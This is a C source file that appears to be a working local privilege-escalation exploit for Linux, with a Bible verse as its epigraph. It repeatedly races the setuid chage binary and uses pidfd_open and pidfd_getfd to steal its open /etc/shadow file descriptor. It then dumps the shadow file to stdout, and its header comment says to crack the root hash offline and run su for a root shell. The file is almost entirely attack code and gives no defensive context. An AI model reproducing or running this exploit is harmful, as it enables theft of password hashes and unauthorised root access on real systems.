/*
 * "It is a fearful thing to fall into the hands of the living God."
 *                                                — Hebrews 10:31
 *
 * chage -l opens /etc/passwd and /etc/shadow before
 * setreuid(ruid, ruid). The drop sets uid=euid=suid=ruid. mm-NULL
 * window in do_exit() lets pidfd_getfd lift the /etc/shadow fd.
 *
 * Crack the root hash offline -> su - -> root shell.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

int main(int argc, char **argv)
{
	const char *user = argc > 1 ? argv[1] : "root";

	for (int round = 0; round < 500; round++) {
		pid_t c = fork();
		if (c == 0) {
			int dn = open("/dev/null", O_RDWR);
			dup2(dn, 1); dup2(dn, 2);
			execl("/usr/bin/chage", "chage", "-l", user, (char *)NULL);
			_exit(127);
		}
		int pfd = syscall(__NR_pidfd_open, c, 0);
		if (pfd < 0) { waitpid(c, NULL, 0); continue; }

		int got = -1;
		for (int a = 0; a < 30000 && got < 0; a++) {
			for (int i = 3; i < 32; i++) {
				int s = syscall(__NR_pidfd_getfd, pfd, i, 0);
				if (s < 0) continue;
				char p[256] = {0}, lk[64];
				snprintf(lk, sizeof(lk), "/proc/self/fd/%d", s);
				ssize_t n = readlink(lk, p, sizeof(p) - 1);
				if (n > 0) p[n] = 0;
				if (strstr(p, "/etc/shadow")) {
					fprintf(stderr, "fd %d -> %s (round=%d try=%d)\n", i, p, round, a);
					got = s;
					break;
				}
				close(s);
			}
		}

		if (got >= 0) {
			char buf[8192];
			lseek(got, 0, SEEK_SET);
			ssize_t n;
			while ((n = read(got, buf, sizeof(buf))) > 0)
				fwrite(buf, 1, n, stdout);
			close(got);
			close(pfd);
			waitpid(c, NULL, 0);
			return 0;
		}
		close(pfd);
		waitpid(c, NULL, 0);
	}
	fprintf(stderr, "no hit in 500 rounds\n");
	return 1;
}
